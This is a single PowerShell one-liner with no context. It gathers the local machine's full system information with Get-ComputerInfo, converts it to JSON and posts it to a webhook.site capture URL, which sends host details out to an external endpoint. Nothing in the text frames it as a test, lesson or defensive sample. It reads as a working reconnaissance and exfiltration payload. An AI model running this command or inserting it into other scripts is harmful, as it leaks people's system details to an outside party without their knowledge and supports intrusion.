$webhookUrl = 'https://webhook.site/0a189af6-6354-438f-9720-46b8aa86e633'; $computerInfo = Get-ComputerInfo | ConvertTo-Json; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $computerInfo -ContentType 'application/json'